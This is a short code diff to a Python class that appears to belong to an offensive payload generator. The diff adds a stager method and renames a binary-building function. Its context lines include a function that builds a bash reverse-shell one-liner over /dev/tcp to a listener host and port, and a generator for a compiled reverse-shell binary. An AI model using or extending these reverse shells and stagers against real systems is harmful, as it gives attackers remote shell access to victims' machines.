@@ -37,6 +37,9 @@ class Generator:
     def ir_bin(self):
         return Generator.bin_reverse_shell(self.lhost, self.lport)
 
+    def ir_stager(self, static=False):
+        return Generator.bin_stager(self.lhost, self.lport, static)
+
     @staticmethod
     def shell_reverse_shell(lhost, lport=80, s='bash'):
         sh = f'{s} -i >& /dev/tcp/{lhost}/{lport} 0>&1'
@@ -65,7 +68,7 @@ class Generator:
             file.writelines(new_lines)
 
     @staticmethod
-    def bin_master(lhost, lport, static=False):
+    def bin_stager(lhost, lport, static=False):
         name = 'cmaster'
 
         compiled_path = f'tmp/{name}'
